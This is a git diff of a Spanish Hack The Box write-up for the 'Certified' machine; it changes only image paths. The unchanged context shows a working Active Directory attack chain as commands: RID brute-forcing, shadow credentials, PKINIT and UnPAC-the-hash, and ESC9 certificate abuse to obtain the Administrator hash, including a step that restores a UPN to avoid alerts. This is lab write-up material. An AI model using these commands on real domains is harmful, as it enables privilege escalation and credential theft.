@@ -266,7 +266,7 @@ Uso crackmapexec para listar usuarios en el Active Directory.
 /home/kali/Documents/htb/machines/certified:-$ crackmapexec smb certified.htb -u "judith.mader" -p "judith09" --rid-brute | grep SidTypeUser
 ```
 
-![](assets/img/htb-writeup-certified/certified1_1.png)
+![](/assets/img/htb-writeup-certified/certified1_1.png)
 
 Ejecuto bloodhound para analizar permisos dentro del dominio.
 
@@ -274,8 +274,8 @@ Ejecuto bloodhound para analizar permisos dentro del dominio.
 /home/kali/Documents/htb/machines/certified:-$ bloodhound-python -u judith.mader -p 'judith09' -c All -d certified.htb -ns 10.10.11.41
 ```
 
-![](assets/img/htb-writeup-certified/certified1_2.png)
-![](assets/img/htb-writeup-certified/certified1_3.png)
+![](/assets/img/htb-writeup-certified/certified1_2.png)
+![](/assets/img/htb-writeup-certified/certified1_3.png)
 
 El análisis muestra que:
 
@@ -316,7 +316,7 @@ Dado que `judith.mader` ahora forma parte del grupo `management`, y este grupo t
 (Entorno_Python)-/home/kali/Documents/htb/machines/certified:-$ python ~/Documents/github/pywhisker/pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target management_svc --action add
 ```
 
-![](assets/img/htb-writeup-certified/certified2_1.png)
+![](/assets/img/htb-writeup-certified/certified2_1.png)
 
 Sincronizo la hora del sistema con el controlador de dominio para evitar errores de autenticación en Kerberos.
 
@@ -330,7 +330,7 @@ Realizo una autenticación mediante PKINIT para obtener un TGT del usuario `mana
 (Entorno_Python)-/home/kali/Documents/htb/machines/certified:-$ sudo python ~/Documents/github/PKINITtools/gettgtpkinit.py -cert-pfx B9d864l1.pfx -pfx-pass 1wTrdCQNVWS01dVJTvPS certified.htb/management_svc hhh.ccache
 ```
 
-![](assets/img/htb-writeup-certified/certified2_2.png)
+![](/assets/img/htb-writeup-certified/certified2_2.png)
 
 Configuro el archivo de caché de credenciales. Y vuelvo a sincronizar el tiempo para evitar problemas.
 
@@ -346,7 +346,7 @@ Por ultimo, Realizo un [UnPAC the hash](https://www.thehacker.recipes/ad/movemen
 (Entorno_Python)-/home/kali/Documents/htb/machines/certified:-$ sudo python ~/Documents/github/PKINITtools/getnthash.py -key 13009a39adb679e473a6adb24f5b8d89416a891de7e91db5a1a6940c6569e24b certified.htb/management_svc
 ```
 
-![](assets/img/htb-writeup-certified/certified2_3.png)
+![](/assets/img/htb-writeup-certified/certified2_3.png)
 
 De esta manera, logro autenticarme a través de Evil-WinRM y obtener acceso remoto al sistema.
 
@@ -386,7 +386,7 @@ Utilice Certipy para buscar y obtener información sobre la configuración de la
 /home/kali/Documents/htb/machines/certified:-$ certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip 10.10.11.41
 ```
 
-![](assets/img/htb-writeup-certified/certified3_1.png)
+![](/assets/img/htb-writeup-certified/certified3_1.png)
 
 De este proceso, identificó una vulnerabilidad clasificada como [ESC9](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension). Esta vulnerabilidad en Active Directory Certificate Services (ADCS) que surge cuando los permisos de administración de la CA están mal configurados.
 
@@ -533,7 +533,7 @@ La cuenta `CA_OPERATOR` se actualiza para que el User Principal Name (UPN) sea `
 /home/kali/Documents/htb/machines/certified:-$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator
 ```
 
-![](assets/img/htb-writeup-certified/certified4_1.png)
+![](/assets/img/htb-writeup-certified/certified4_1.png)
 
 Se solicita un certificado utilizando la plantilla vulnerable `CertifiedAuthentication`. El certificado emitido contiene el UPN de `Administrator`, lo que permite su uso para autenticación con privilegios elevados.
 
@@ -541,7 +541,7 @@ Se solicita un certificado utilizando la plantilla vulnerable `CertifiedAuthenti
 /home/kali/Documents/htb/machines/certified:-$ sudo certipy-ad req -username ca_operator@certified.htb -p 12345678 -ca certified-DC01-CA -template CertifiedAuthentication -debug
 ```
 
-![](assets/img/htb-writeup-certified/certified4_2.png)
+![](/assets/img/htb-writeup-certified/certified4_2.png)
 
 El UPN de `CA_OPERATOR` se restaura a su valor original para revertir cualquier modificación que pueda generar alertas o inconsistencias en el entorno.
 
@@ -549,7 +549,7 @@ El UPN de `CA_OPERATOR` se restaura a su valor original para revertir cualquier 
 /home/kali/Documents/htb/machines/certified:-$ certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
 ```
 
-![](assets/img/htb-writeup-certified/certified4_3.png)
+![](/assets/img/htb-writeup-certified/certified4_3.png)
 
 A continuación, utilizo el certificado emitido para autenticarme y verificar que obtengo el hash NTLM del usuario `Administrator`.
 
@@ -559,7 +559,7 @@ A continuación, utilizo el certificado emitido para autenticarme y verificar qu
 /home/kali/Documents/htb/machines/certified:-$ sudo certipy-ad auth -pfx administrator.pfx -domain certified.htb
 ```
 
-![](assets/img/htb-writeup-certified/certified4_4.png)
+![](/assets/img/htb-writeup-certified/certified4_4.png)
 
 Procedo a autenticarme a través de Evil-WinRM y consigo la flag.
 
